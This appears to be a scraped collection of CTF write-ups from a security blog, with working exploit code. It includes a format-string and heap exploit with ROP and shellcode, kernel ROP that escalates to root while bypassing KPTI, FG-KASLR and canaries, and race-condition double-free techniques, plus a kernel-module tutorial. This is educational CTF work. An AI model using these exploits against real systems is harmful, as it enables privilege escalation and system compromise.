io=process('./chall')\n\nreu = lambda a : io.recvuntil(a)\nsla = lambda a,b : io.sendlineafter(a,b)\nsl = lambda a : io.sendline(a)\nrel = lambda : io.recvline()\nsa = lambda a,b : io.sendafter(a,b)\nre = lambda a : io.recv(a)\ns = lambda a : io.send(a)\n\n\n#Defining functions for various heap operations\n\ndef add(idx,size,data):\n    sla(\"&gt;&gt; \",'1')\n    sla(\"Index : \",str(idx))\n    sla(\"size : \",str(size))\n    sa(\"details -&gt; \\n\",data)\n\ndef view(idx):\n    sla(\"&gt;&gt; \",'2')\n    sla(\"Candidate: \",str(idx))\n\ndef hack(idx):\n    sla(\"&gt;&gt; \",'2020')\n    sla(\"Candidate: \",str(idx))\n\ndef free(idx):\n    sla(\"&gt;&gt; \",'3')\n    sla(\"Candidate: \",str(idx))\n\ndef move_on():\n    sla(\"&gt;&gt; \",'4')\n\n#Mimicing the random function implemented by binary to break it\ndef get_rand():\n    toc = c_long()\n    tic = libc.time(byref(toc))\n    while True:\n        libc.srand(tic/60)\n        lower = 0x1000\n        upper = 0xffff\n        rand_num = libc.rand()%(upper-lower+1) + lower\n        delay = libc.rand()%300 + 1\n        end_time = tic + delay\n        tic = tic + delay\n        libc.srand(end_time/30)\n        rand_num_2 = libc.rand()%(upper-lower+1) + lower\n        region = rand_num &amp; rand_num_2\n        if(region&gt;0x1000):\n            return region\n\n\nNow that we have calculated the age , we need to somehow overwrite the age pointer with this so that we pass the check.\nTriggering The Format String Bug\nYou can think of directly overwriting the age pointer with the afore calculated random number , but the issue is , I had added checks for directly not allowing numbers greater than 0x900 to be present in the input string.\n//%n is allowed in format string , but u cant write large numbers (greater than 0x900) with %n\nvoid check_num(char *p)\n{\n    while (*p) \n    { \n        if ( isdigit(*p)) \n        {\n            long val = strtol(p, &amp;p, 10); \n            if(val&gt;0x900)\n            {\n                puts(\"Not allowed\");\n                Exit();\n            }\n        } \n        else\n            p++;\n    }\n    return;\n}\n\n\nSo it only leaves us with the solution of writing the random number on stack and then copying it from there to the age pointer.\nWe can copy numbers from stack using %*offset$d. Let's use it in our exploit.\n{: .notice}\n\nif __name__==\"__main__\":\n\n    region = get_rand()\n    log.info(\"region = \" + hex(region))\n    #Using format string to pass the initial check , to enter the secret_service\n    payload = ('%*18$d' + '%15$n').ljust(16,'a') + p64(region)\n    sa(\"Name: \",payload)\n    sla(\"Age: \",\"123\")\n    sleep(1)\n\n\n\nWith this , we satisfy all checks and enter the secret service.\nThe secret service is pretty much a commonplace menu driven code with Enroll , View , Remove and an extra functionality which I termed as Hack. Later on , a feedback is requested which initialises a separate thread to do stuff.\nBut why so much obfuscation just to take a feedback , there's a reason for that guys, hold your horses.\nvoid secret_service()\n{\n    \n    pthread_t t1;\n    while(1)\n    {\n        unsigned int option = menu();\n        switch(option)\n        { \n            case 1: Enroll();\n            break;\n            case 2: View();\n            break;\n            case 3: Remove();\n            break;\n            case 4: goto Move_On;\n            break;\n            case 2020: Hack();\n            break;\n            case 5: exit(EXIT_SUCCESS);\n        }\n    }\n    Move_On:\n    puts(\"Do u want to leave a feedback for the service?(y/n)\");\n    scanf(\"%c\",&amp;ch);\n    if(!strcmp(&amp;ch,\"y\"))\n    {\n        pthread_create(&amp;t1,NULL,thread_entry,NULL);\n        pthread_join(t1,NULL);\n    }\n    else\n    {\n        puts(\"Thank you!\");\n    }\n    exit(EXIT_SUCCESS);\n}\n\nLet's see how we can hack the secret service before getting into the feedback part.\n\nThe Enroll Function\n\n//Enroll with the use of safe calloc\nvoid Enroll()\n{\n    if(enrolled&lt;=2)\n    {\n        printf(\"Enter Enrollment Index : \");\n        unsigned int index = getInt(),size; \n        if(is_enrolled[index] || index &lt; 0 || index &gt; 2)\n        {\n            puts(\"Invalid or already enrolled!\");\n            return;\n        }\n        printf(\"Enter size : \");\n        size = getInt();\n        if(size&lt;0x7f || size&gt;=65530)\n        {\n            puts(\"Size not allowed!\");\n            Exit();\n        }\n        sizes[index] = size;\n        puts(\"Enter your details -&gt; \");\n        char *details = (char *)calloc(sizes[index],1);\n       // printf(\"Allocation happened at -&gt; %llx\\n\",details); Debug info , dont mind\n        getInp(details,sizes[index]);\n        enrolled_table[index] = details;\n        is_enrolled[index] = 1;\n        enrolled++;\n        puts(\"Ok!

This is the place from where canary is actually loaded into the fs segment register for the stack check fail.\n{: .notice}\nNow we have plain overflow and we can assume there's no canary , cool isn't it?\nWell what next?\nROP And Shellcode To Grab That Flag\nThe first thing that comes to mind is , call mprotect on the region we have overflow , and then shellcode.\nWell , thats it.\nLet's script it till there.\n    move_on()\n    gdb.attach(io)\n    sla(\"service?(y/n)\\n\",'y')\n    #Trigger integer overflow with type confusion bug to get large write on stack\n    sla(\"feedback: \",'-1')\n\n\nBut as you would have noticed , a weird function supress_stdout is being called which redirects stdout to /dev/null. So how do we get around it? Simple , you just have to mimic it.\nNow all we have to do is , write a simple shellcode. \nWait , one more thing , what about those seccomp constraints which let you read only from fd 0 and write only to fd 1.\n\nTo open flag at fd 0 , just close fd 0 and open flag , it will open at fd 0 itself.\nNow you can read the flag at fd 0 and write it to stdout.\n\nHere's the remaining script.\n    #The shellcode first reopens stdout by mimicing the mechanism of supress_stdout function\n    #It does so by calling dup2 , changing file descriptor of stdout back to 1\n    #Then we close stdin so that flag gets opened at fd 0.\n    #After that , we call openat syscall to open flag at fd 0, as open is not allowed\n    #Finally we read flag in memory and write it out\n    shellcode = asm('''\n            xor rdi,rdi\n            mov edi,DWORD PTR [rbp-0x88]\n            mov rsi,1\n            mov rax,33\n            syscall\n            mov rax,3\n            syscall\n            mov rax,3\n            mov rdi,0\n            xor rsi,rsi\n            xor rdx,rdx\n            syscall\n            mov rax,257\n            mov rdi,0xffffff9c\n            mov r9,0x67616c66\n            push r9\n            push rsp\n            pop rsi\n            mov rdx,0\n            mov r10,0644\n            syscall\n            mov rax,0\n            mov rdi,0\n            lea rsi,[rsp-0x200]\n            mov rdx,0x50\n            syscall\n            mov rax,1\n            mov rdi,1\n            syscall\n            ''')\n    #Gadgets\n    mprotect = libc_base + LIBC.symbols['mprotect']\n    pop_rdi = libc_base + 0x0000000000026b72\n    pop_rsi = libc_base + 0x0000000000027529\n    pop_rdx_junk = libc_base + 0x00000000001626d6\n    mmap_base = libc_base - 0x5000\n    log.info(\"mmap_base = \" + hex(mmap_base))\n    shellcode_addr = mmap_base + 0xf20\n    fflush = libc_base + LIBC.symbols['fflush']\n    stdout = libc_base + LIBC.symbols['_IO_2_1_stdout_']\n    rbp = libc_base - 0x4130\n    #Adding ROP chain for buffer overflow vuln, the idea is to overwrite TCB structure from where the segment register actually takes canary for checking ,thus overwriting the original canary and triggering overflow\n    payload = 'a'*0x80 + p64(rbp)\n    payload += p64(pop_rdi)\n    payload += p64(mmap_base)\n    payload += p64(pop_rsi)\n    payload += p64(0x10000)\n    payload += p64(pop_rdx_junk)\n    payload += p64(7)*2\n    #We intend to call mprotect to make mmaped region itself executable\n    payload += p64(mprotect)\n    payload += p64(shellcode_addr)\n    payload += shellcode\n    payload += 'a'*(0x8e8 - len(payload))\n    log.success('Getting flag')\n    sla(\"feedback: \",payload)\n    io.interactive()\n\n\nConclusion\nI have to give credits to kileak from OpenToAll for pointing out the unintended solution to my challenge , much appreciated.\nFlag\nHere's the flag\nFLAG: inctf{wh3r3_d1d_y0u_l4nd_up_f1nally_st4ck_H34p_st4ck_0r_H34p_1963290327101999}\nAll in all , I had lot of fun making the challenge which was intended to teach the participants about 3 vulnerabilities -\n\nTricky Format String.\nLeaking memory from calloc.\nTCB overwrite.\n\nHere's the exploit script exp.py\n","id":"https://pwnverse.github.io/posts/inctf-secret-service/","title":"InCTFi 2020 Secret Service Writeup"},"https://pwnverse.github.io/posts/kernel-rop/":{"body":"tl;dr\n\nUse the kernel Buffer overflow to defeat the hottest kernel defences.\n\nReversing\nThe bof bug is in the plain sight (exercise for the reader to find out) so there's nothing really to reverse in this.\nSetting up the debug environment\n\nExtract the initramfs.cpio.gz with - \n\ngunzip initramfs.cpio.gz\nmkdir rootfs &amp;&amp; cd rootfs\ncat ../initramfs.cpio | cpio --extract\n\n\nEdit the rcS script at /etc/init.d and change the uid of the user to 0 with setsid /bin/cttyhack setuidgid 0 /bin/sh.\nAlso, comment out the echo 1 happening on dmesg and kptr.

The most annoying of them are the SMAP (ROP only in the kernel land) and the FG-KASLR (Randomize individual functions).\nHence, to leak memory, we first have to find addresses of the functions which are not effected by FG-KASLR (we're lucky that this mitigation doesnt randomize every kernel function). \n\nThe functions from _text (kernel image base) to __x86_retpoline_r15 (image base + 0x400dc6) are all uneffected by FG-KASLR.\ncommit_creds and prepare_kernel_cred do not lie in this region and hence we can't proceed directly.\nswapgs_restore_regs_and_return_to_usermode is the function which sweetly defeats the KPTI (separation of page tables in the kernel and usermode) mitigation and thus allowing us to return to userland. To our relief, this function is also uneffected by FG-KASLR. For simplicity we will call this function as kpti trampoline.\n\nSo, how do we leak commit_creds and prepare_kernel_cred?\nLeaking through ksymtab\nEach of these functions (commit_creds and prepare_kernel_cred) have a kernel symbol table into which their offset is stored from the kernel base.\nstruct kernel_symbol {\n\t  int value_offset;\n\t  int name_offset;\n\t  int namespace_offset;\n};\n\nOn inspection, we find that the symbol table functions are not effected by FG-KASLR.\ncat /proc/kallsyms | grep ksymtab_commit_creds\n-&gt; ffffffffb7f87d90 r __ksymtab_commit_creds\ncat /proc/kallsyms | grep ksymtab_prepare_kernel_cred\n-&gt; ffffffffb7f8d4fc r __ksymtab_prepare_kernel_cred\n\nHence , we can  read the offset value of each of these symbol tables and get the addresses of the actual functions thus completely bypassing FG-KASLR.\nGetting necessary Leaks\nSince we can read from the entire stack, we can find a lot of kernel pointers on the stack from which we can obtain kernel base.\nvoid get_leak(void){\n    unsigned n = 40;\n    unsigned long leak[n];\n    read(fd, leak, sizeof(leak));\n    canary = leak[16];\n    image_base = leak[38] - 0xa157ULL;\n    printf(\"[+] canary -&gt; 0x%lx\\n\",canary);\n    printf(\"[+] image_base -&gt; 0x%lx\\n\",image_base);\n}\n\nSince canary is also enabled,  we leak it as well. From here , we can also offset to a few useful gadgets and functions like kpti trampoline.\nLeaking commit_creds\n\nA few things differ from userland to kernel land buffer overflows, the very first of them is the registers popped at the end of a function. Here, we have the canary followed by rbx, r12 and rbp being popped before getting to rip.\nOur overflow starts immediately from overwriting canary.\nSo , let's script it now.\n\nvoid get_cred(void){\n    unsigned n = 50;\n    unsigned long payload[n];\n    unsigned off = 16;\n    ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL;\n    ksymtab_commit_creds = image_base + 0xf87d90UL;\n    kpti_trampoline = image_base + 0x200f10UL + 22UL;\n    pop_rax_ret = image_base + 0x4d11UL;\n    mov_rax_rax_16_rbp = image_base + 0x4aadUL;\n\n    payload[off++] = canary;\n    payload[off++] = 0x0; // rbx\n    payload[off++] = 0x0; // r12\n    payload[off++] = 0x0; // rbp\n    payload[off++] = pop_rax_ret; // return address\n    payload[off++] = ksymtab_commit_creds - 0x10; // rax &lt;- __ksymtabs_commit_creds - 0x10\n    payload[off++] = mov_rax_rax_16_rbp; // rax &lt;- [__ksymtabs_commit_creds -&gt; offset]\n    payload[off++] = 0x0; // dummy rbp\n    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22\n    payload[off++] = 0x0; // dummy rax\n    payload[off++] = 0x0; // dummy rdi\n    payload[off++] = (unsigned long)leak_cred;\n    payload[off++] = user_cs;\n    payload[off++] = user_rflags;\n    payload[off++] = user_sp;\n    payload[off++] = user_ss;\n\n    puts(\"[*] Prepared payload to leak commit_creds()\");\n    ssize_t w = write(fd, payload, sizeof(payload));\n    puts(\"[!] Should never be reached\");\n}\n\n\nTo get offset of ksymtab_commit_creds, we have used a gadget which is mov rax, qword [rax+16] ; ret and hence we pass ksymtab_commit_creds-0x10.\nTo return to a userland function, we first have to call our kpti_trampoline. This function initially has a lots of popping of registers and so we skip that with eyes closed.\nFinally, we set leak_cred as our userland function and restore all the EFLAGS for smooth return to userland.\nThe EFLAGS are preserved by us by calling a special function before anything else, which is our save_state function which stores all the EFLAGS so that we can reuse them for returning to the userland.\n\n\nvoid save_state(){\n    __asm__(\n        \".intel_syntax noprefix;\"\n        \"mov user_cs, cs;\"\n        \"mov user_ss, ss;\"\n        \"mov user_sp, rsp;\"\n        \"pushf;\"\n        \"pop user_rflags;\"\n        \".att_syntax;\"\n    );\n    puts(\"[*] Saved state\");\n}\n\nget_creds\nWith some inline assembly , we can directly move the value of rax which now has the offset of our commit_creds into a global variable.\nvoid leak_cred(){\n    //using inline assembly to store value of rax into a temp variable\n    __asm__(\".intel_syntax noprefix;\"\n            \"mov temp_store,rax;\"\n            \".att_syntax\");\n    commit_creds = ksymtab_commit_creds + (int)temp_store;\n    printf(\"[+] commit_creds -&gt; 0x%lx\\n\",commit_creds);\n    get_pkc();\n}\n\nFinally , we now call the function to prepare leaking prepare_kernel_cred.\nLeak prepare_kernel_cred\nWith an exact appoach as the previous payload, we can leak prepare_kernel_cred.\nvoid get_pkc(){\n    unsigned long payload[50] = {0};\n    int i=0x10;\n    payload[i++] = canary;\n    payload[i++] = 0; //rbx\n    payload[i++] = 0; //r12\n    payload[i++] = 0; //rbp\n    payload[i++] = pop_rax_ret;\n    payload[i++] = ksymtab_prepare_kernel_cred-0x10;\n    payload[i++] = mov_rax_rax_16_rbp;\n    payload[i++] = 0; //pop rbp\n    payload[i++] = kpti_trampoline;\n    payload[i++] = 0; //pop rax\n    payload[i++] = 0; //pop rdi\n    payload[i++] = (unsigned long)leak_pkc;\n    payload[i++] = user_cs;\n    payload[i++] = user_rflags;\n    payload[i++] = user_sp;\n    payload[i++] = user_ss;\n    puts(\"[*] Launching payload to leak prepare_kernel_cred!\");\n    write(fd,payload,sizeof(payload));\n}\n\nThis time, we pass control to leak_pkc userland function.\n\nvoid leak_pkc(){\n    __asm__(\".intel_syntax noprefix;\"\n            \"mov temp_store,rax;\"\n            \".att_syntax;\");\n    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)temp_store;\n    printf(\"[+] prepare_kernel_cred -&gt; 0x%lx\\n\",prepare_kernel_cred);\n    pkc();\n}\n\nAnd finally, we leak prepare_kernel_cred.\nprepare_kernel_cred(0)\nWe will get to our root shell in 2 stages.\n\nFirst, we will call prepare_kernel_cred(0) and finally store the value of cred_structure into the temporary variable and then call commit_creds on that.\n\nvoid pkc(){\n    unsigned long payload[50] = {0};\n    int i=0x10;\n    pop_rdi = image_base + 0xed00;\n    printf(\"[*] pop_rdi = 0x%lx\\n\",pop_rdi);\n    payload[i++] = canary;\n    payload[i++] = 0;

They extend the functionality of the kernel without needing to reboot the system. \nDevice Driver is also a kernel module. Without modules , we would have to build monolithic kernels and add new functionality directly into the kernel image.\nHow do kernel modules get into kernel\nWhen kernel needs a feature that is not present in the kernel , it runs kernel module daemon kmod execs modprobe to load the module in. modprobe is passed a string in one of two forms. \n\nA module name like softdog or ppp.\nA more generic identifier like char-major-10-30.\n\nIf generic identifiers have aliases , then modprobe knows what the identifier is referring to.\nNext it has to checks for any dependencies that the module being loaded has , ie , whether it requires any pther modules to be loaded.\nLastly , modprobe uses insmod to first load the prerequisite modules into the kernel and finally the requested module. modprobe directs insmod to /lib/modules/version/.\ninsmod -&gt; dumb about location of modules\nmodprobe -&gt; aware of default location of modules , order of inserting modules etc.\nmodprobe knows all that as it parses /lib/modules/version/modules.dep. For the kernel , I'll be using the now latest linux kernel 5.8 to compile and insert my modules into.\nKernel Module Programming\nHello World\nKernel modules must have atleast 2 functions - init_module (called when the module is insmoded into the kernel) and cleanup_module called when the module is rmmoded.\n\n#include &lt;linux/header.h&gt; /*Needed by all modules*/\n#include &lt;linux/kernel.h&gt; /* Needed for kernel_info */\n\nint init_module(void)\n{\n    printk(KERN_INFO \"Hello World \\n\");\n    return 0;\n}\n\nvoid cleanup_module(void)\n{\n    printk(KERN_INFO \"Goodbye\\n\");\n}\n\n\ncleanup_module -&gt; undoes whatever init_module did so that the module can be unloaded safely.\nprintk()\nIt's not meant for communication with user , but for logging information or give warnings. Each printk() statement comes with a priority. There are 8 priorities and the kernel has macros for them, which are a part of linux/kernel.h. We use high priority printk KERN_ALERT to make printk() print to screen rather than just log to files.\nInfo about modules\nuse modinfo to see information of a kernel object file.\nAdditional details of Makefiles for kernel modules are available at -&gt; Documentation/kbuild/makefiles.txt.\nAll loaded modules are loaded into the kernel and listed in lsmod or cat /proc/modules.\n\nWe can rename our init and cleanup modules with module_init() and module_exit macros defined in linux/init.h.\n\n/* \n * hello2.c \n*/\n\n#include &lt;linux/module.h&gt;\n#include &lt;linux/kernel.h&gt;\n#include &lt;linux/init.h&gt;\n\nstatic int __init hello2_init(void)\n{\n    printk(KERN_INFO,\"Hello world\\n\");\n    return 0;\n}\n\nstatic int __init hello2_exit(void)\n{\n    printk(KERN_INFO,\"Goodbye\\n\");\n}\n\nmodule_init(hello2_init);\nmodule_exit(hello2_exit);\n\n\n\nThe __init macro -&gt;

The nproc specifying the make process to run in multiple threads for faster compilation speeds.\nNow comes the tricky part. To boot into the kernel , all you need is \n\nA kernel bzImage which is short for a compressed kernel image. \nWe'll also need a init directory which would run an init script for us to get our kernel to boot. This is where we copy our compiled modules and they get insmoded through the init script inside the rootfs.img.\n\nWe can acquire a rootfs.img from any of the CTF challenges and work with it for now from here\nExtracting rootfs.img\n$ mkdir rootfs &amp;&amp; cd rootfs\n$ cat ../rootfs.cpio | cpio --extract\n\n\nNow you can copy your modules into the rootfs directory and pack it again into it's compresses img format.\nDont forget to edit the init script to insmod the modules that you've copied to the rootfds folder\n{: .notice}\nPacking rootfs.img\nFrom the directory rootfs that we created just a few moments ago , do \n$ find . | cpio -o -H newc &gt; ../rootfs.cpio\n$ cd ../ &amp;&amp; rm -dR rootfs\n\nNow we're ready to boot into our newly compiled kernel with our modules loaded.\nBooting with qemu\nFrom inside the kernel source directory, fire up qemu with appropriate paths for all arguments.\nMake sure you specify the path of rootfs.img that we acquired just now.\n{: .notice}\n#!/bin/bash\n\nqemu-system-x86_64 \\\n    -kernel arch/x86_64/boot/bzImage \\\n    -nographic \\\n    -append \"console=ttyS0\" \\\n    -initrd rootfs.img \\\n    -m 512 \\\n    --enable-kvm \\\n    -cpu host \\\n\n\nThis script should fire up our kernel , lsmod should successfully show our loaded modules and dsmg -r | tail -20 should be sufficient to show the functionality of our loaded modules.\nNo headers and we use printk??\nIn the hello world example, you might have noticed that we used a function, printk() but didn't include a standard I/O library. That's because modules are object files whose symbols get resolved upon insmod'ing. The definition of these functions comes from the kernel itself.\n","id":"https://pwnverse.github.io/posts/kernelmodule/","title":"Kernel Module Programming - 1"},"https://pwnverse.github.io/posts/kqueue/":{"body":"tl;dr\n\nUse the integer overflow to trigger a kernel heap overflow.\nUse the heap overflow to overwrite tty structure function pointers to get code execution.\n\nChallenge Points: 986\nNo of Solves: 7\nChallenge Author: Cyb0rG\nChallenge description\nA long queue awaits you in ring0\nTo start with , the challenge handout folder comes with bzImage, rootfs.cpio, run.sh and source code files.\nWe immediately see that smep and smap are disabled in the run.sh.\nAnalysis\nThe module implements create, delete , edit and save functionalities.\nBefore heading to the functionalities, it is better we refer to the important structures being used for various operations.\nQueue structure\ntypedef struct{\n    uint16_t data_size;\n    uint64_t queue_size; /* This needs to handle larger numbers */\n    uint32_t max_entries;\n    uint16_t idx;\n    char* data;\n}queue;\n\nStructure of each entry in queue\nstruct queue_entry{\n    uint16_t idx;\n    char *data;\n    queue_entry *next;\n};\n\nStructure of request from userspace\ntypedef struct{\n    uint32_t max_entries;\n    uint16_t data_size;\n    uint16_t entry_idx;\n    uint16_t queue_idx;\n    char* data;\n}request_t;\n\n\nCreate_kqueue - \n\nstatic noinline long create_kqueue(request_t request){\n    long result = INVALID;\n\n    if(queueCount &gt; MAX_QUEUES)\n        err(\"[-] Max queue count reached\");\n\n    /* You can't ask for 0 queues , how meaningless */\n    if(request.max_entries&lt;1)\n        err(\"[-] kqueue entries should be greater than 0\");\n\n    /* Asking for too much is also not good */\n    if(request.data_size&gt;MAX_DATA_SIZE)\n        err(\"[-] kqueue data size exceed\");\n\n    /* Initialize kqueue_entry structure */\n    queue_entry *kqueue_entry;\n\nHere are the observations we can make from the necessary checks happening above -\n\nqueueCount must not exceed 5.\nrequest.max_entries should not be less than 1.\nrequest.data_size should not exceed 0x20.\nrequest.data_size is the size of each queue entry and within a queue , each entry has the same data_size.\n\n    /* Check if multiplication of 2 64 bit integers results in overflow */\n    ull space = 0;\n    if(__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space) == true)\n        err(\"[-] Integer overflow\");\n\n    /* Size is the size of queue structure + size of entry * request entries */\n    ull queue_size = 0;\n    if(__builtin_saddll_overflow(sizeof(queue),space,&amp;queue_size) == true)\n        err(\"[-] Integer overflow\");\n\n    /* Total size should not exceed a certain limit */\n    if(queue_size&gt;sizeof(queue) + 0x10000)\n        err(\"[-] Max kqueue alloc limit reached\");\n\n\nHere we see that multiplication of sizeof(queue_entry) and request.max_entries+1 is being stored in space after making sure that it doesn't overflow 64 bits.\nWe see the addition of sizeof(queue) and the above result of multiplication being stored in queue_size.\n\nSo each queue is essentially creating space for it's entries , the number of entries come from the request.max_entries which determine the size of the entire queue.\n    /* All checks done , now call kmalloc */\n    queue *queue = validate((char *)kmalloc(queue_size,GFP_KERNEL));\n\n    /* Main queue can also store data */\n    queue-&gt;data = validate((char *)kmalloc(request.data_size,GFP_KERNEL));\n\n    /* Fill the remaining queue structure */\n    queue-&gt;data_size   = request.data_size;\n    queue-&gt;max_entries = request.max_entries;\n    queue-&gt;queue_size  = queue_size;\n\nOnce above checks are done, the queue is allocated.

There is no need of leaks since we have shellcode execution , we can easily control some register which already points to a kernel code address and change it to point to any function we wish to call in kernel.\nConclusion\nThe challenge could have been made better by enabling smep and smap , it would have been more fun to leak kernel pointers with partial overwrites but yes , the exploit would have been a lot less reliable in that case. \nHere is the complete exploit.\nFlag - inctf{l3akl3ss_r1p_w1th_u5erSp4ce_7rick3ry}\n","id":"https://pwnverse.github.io/posts/kqueue/","title":"Kqueue - InCTF Internationals 2021"},"https://pwnverse.github.io/posts/kstack/":{"body":"So this week, I came across yet another kernel exploitation challenge and the reason I'm documenting the writeup (even if there're plenty of better ones available) is simply because I had to use multiple race conditions to get kernel instruction pointer.\ntl;dr\n\nAbuse the race condition to leak kernel base.\nResuing the race condition , get write on seq_operations structure.\nWrite to fd of the seq structure using setxattr.\nPivot stack to userspace address since there is no SMAP.\nStandard commit_creds(prepare_kernel_creds(0)) ROP.\n\nSetting up the debug environment\n\nUnpack rootfs.cpio with \n\nmkdir rootfs &amp;&amp; cd rootfs\nsudo su\ncat ../rootfs.cpio | cpio --extract\n\n\nEdit the init script , comment out the echo 1 happening on kptr_restrict and dmesg_restrict.\nAdd the setsid /bin/cttyhack setuidgid 0 /bin/sh to get root for debugging.\nDisable kaslr in the runner script.\n\nUse this script to compile and copy exploit automatically in later stages.\n#!/bin/bash\n\ngcc -o exp exp.c --static -lpthread\ncp exp rootfs\ncd rootfs\nfind . | cpio -o -H newc &gt; ../rootfs.cpio\ncd ..\n\nReversing\nThe author was benevolent enough to provide us with a self explanatory source code.\nFor the sake of brevity , we'll just look into the important part of it.\nstatic long proc_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n  Element *tmp, *prev;\n  int pid = task_tgid_nr(current);\n  switch(cmd) {\n  case CMD_PUSH:\n    tmp = kmalloc(sizeof(Element), GFP_KERNEL);\n    tmp-&gt;owner = pid;\n    tmp-&gt;fd = head;\n    head = tmp;\n    if (copy_from_user((void*)&amp;tmp-&gt;value, (void*)arg, sizeof(unsigned long))) {\n      head = tmp-&gt;fd;\n      kfree(tmp);\n      return -EINVAL;\n    }\n    break;\n  case CMD_POP:\n    for(tmp = head, prev = NULL; tmp != NULL; prev = tmp, tmp = tmp-&gt;fd) {\n      if (tmp-&gt;owner == pid) {\n        if (copy_to_user((void*)arg, (void*)&amp;tmp-&gt;value, sizeof(unsigned long)))\n          return -EINVAL;\n        if (prev) {\n          prev-&gt;fd = tmp-&gt;fd;\n        } else {\n          head = tmp-&gt;fd;\n        }\n        kfree(tmp);\n        break;\n      }\n      if (tmp-&gt;fd == NULL) return -EINVAL;\n    }\n    break;\n  }\n  return 0;\n}\n\n\nWe have the push and pop operations.\n\nPush\n\nThe push operation first kmallocs a chunk of 8 bytes.\nIt then tries to copy_from_user 8 bytes of data from userspace.\nIf copy_from_user fails , it frees the chunk that was allocated.\n\nPop\n\nTry to copy_to_user 8 bytes of tmp-&gt;value.\nIf it succeeds , the head pointer is appropriately set and finally free is called on the chunk on which pop was requested.\n\nBug\nThere's no implementation bug as such in this small program , but if you see , the ioctl operations dont have any locks and hence we can request multiple operations at once using two threads.\nExploit\nThe idea is that we execute a multi-stage exploit to successively leak and get write on a useful structure. So how do we go about doing this?\nBy making use of the race condition, we can actually invoke a double free.\n\nIf we call a pop operation on an untouched memory region, we can trigger a pagefault in copy_to_user, and this opens up a race window for exploitation.\nSo , if we can monitor this untouched memory region from another thread, we can very well handle this page fault and do some more operations until the page fault is fixed and control is transferred back to pop function.\n\n                                            ┌───────────────────────────────────┐     ┌─────────────────────┐\n                                            │                                   │     │                     │\n                            ┌──────────────►│ page_fault   -&gt; call pop on valid ├────►│ calls free(chunk)   │\n                            │               │   handler            memory       │     │ after copy_from_user│\n                            │               │                                   │     │                     │\n                       ┌────┴──────┐        └─────────────────────────────┬─────┘     └────┬────────────────┘\n                       │ page_fault│                                      │                │\n                       │           │                                      │  return back   │\n                       └───────────┘                                      └───────┬────────┘\n                             ▲                                                    │\n                             │                                                    │\n                             │                                                    │ page_fault handler returns \n┌───────────────┐    ┌───────┴─────────┐                                  ┌───────▼──────────────┐\n│               │    │                 │                                  │                      │\n│pop(race_page) ├───►│  copy_from_user ├─────────────────────────────────►│   free(chunk)        │\n│               │    │                 │                                  │                      │\n└───────────────┘    │                 │                                  │                      │\n                     └─────────────────┘                                  └──────────────────────┘\n\n\nTo manage page faults from userspcace , the kernel provides us with userfaultfd. With userfaultfd, we can monitor an mmaped page from another thread and handle our page faults.\nGoing for leaks\nThe issue here is that, copy_from_user and copy_to_user write and read from the next 8 bytes of a chunk , so we can't really leak normally by getting allocation on a useful structure. Another reason is that, copy_from functions will null out memory. So, our ultimate option is to leak memory via race condition.\nTo do so, \n\nopen and close a couple of /proc/self/stat , nothing but our seq_operations structure. This will make sure our next kmalloc allocates from a freed structure which has kernel pointers.\nInitialize userfaultfd on our race page , in this case 0xf00d000.\npush a value and call pop on our race page which will cause a page fault in copy_from_user.\nIn the fault handler , we immediately call pop on a valid address and successfully leak kernel pointer. \n\nDouble free to RIP\nAfter we leak , we can find a suitable stack pivot gadget from the kernel. Similarly , we can now cause a double free in heap , and using that,  we get overlapping of seq_operations and setxattr structures. The reason for chosing this overlap is that , setxattr lets us write 8 bytes to the fd of our chunk with it's size field. \nSo , using this , we can overwrite the kernel function pointer at the fd of our seq_operations structure and get RIP by calling read on the file descriptor of the opened structure.\nShort Info\nI had a good time (with all due pun intended) debugging the kernel and source code auditing of setxattr as I had repeated kernel panics due to a silly mistake I had made in my script. But this debugging led me to another fruitful result.\nInternally, setxattr calls kmalloc and kfree in the end after setting the fd. The fd pointer actually gets overwritten with a kernel executable address which points very close to a ret instruction. So , what happens is , when read is called on the fd , it actually executes the fd pointer first , but it returns immediately and then executes fd + 0x18 pointer. This is the offset which actually gives us the RIP control.\nHence , the idea is to spray our gadget all over the seq_operations structure.\nConclusion\nThe idea of the challenge was something different from a normal race condition.

Since the CTF was conducted by RPISEC , nothing easy could be expected. I spent most of my time during the CTF on the challenge leakguard but we couldn't solve it during the CTF. But when I took sometime off and tried it , I finally solved it :). \nChallenge description\nWe'd been given the challenge binary , the libc 2.27 and a mysterious library which is being preloaded to run with the binary , the leakguard.so.\nInitial analysis\nLet's have a quick look at checksec.\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : FULL\n\nReversing the shared object\nAn interesting share object is shipped along with the binary executable. Here's what it does:\n\nWrapper around __GI_libc_write internally called in every call to puts.\nReads data from /proc/self/maps which contains the virtual memory maps of the binary. (Pretty much vmmap of gdb)\nParse through the string which contains the data to be printed and check if anywhere , a valid memory address is present, if so , null the address number of bytes. It stops at null.\n\nReversing the binary\nThe candles binary has standard heap functions which are as follows : \n\nAdd_wax\n\n\nCheck for an empty element in the bss wax table.\nSubsequently,  take input for choice of oil and dye.\nMalloc a chunk of size 0x18 , then create a structure as follows -\n\nstruct wax{\ncandle_count;\nlong* ptr_to_oil_name;\nlong* ptr_to_dye_name;\n};\n\nInitially , while adding a wax , the candle_count is set to 1.\n\nRemove_wax\n\n\nReduce the candle reference counter , check if it is 0 , and if so , free the wax structure ,else return without freeing the wax structure.\nNull out the wax pointer in the wax bss table.\n\n\nAdd candle\n\n\nTake input of the index of wax to be associated with the candle. \nMalloc a candle structure of size 0x18.\nRead 0x10 into the candle structure.\nIncrement the candle reference counter in the respective wax structure.\n\nThe structure of candle structure is as follows :\nstruct candle {\n\nchar name[0x10];\nunsigned char* reference_counter_ptr;\n};\n\n\nView candle\n\n\nPrint data of all candles but there's an additional check here. The leakguard.so comes into picture in the every call to puts. Since puts internally calls __GI_libc_write and leakguard is basically a wrapper around __GI_libc_write function.\nIf data contains a memory address , it gets nulled out :(.\n\n\nRemove_candle\n\n\nCheck if candle reference pointer is null or not , if null , reduce the candle count in the linked structure.\nCheck if the candle count linked to the wax structure is 0 or not , if 0 , free the wax structure without nulling out the wax pointer on the wax bss table.\nFinally, free the candle and null out the candle pointer.\n\nEnough of reversing , let's get to some pwn 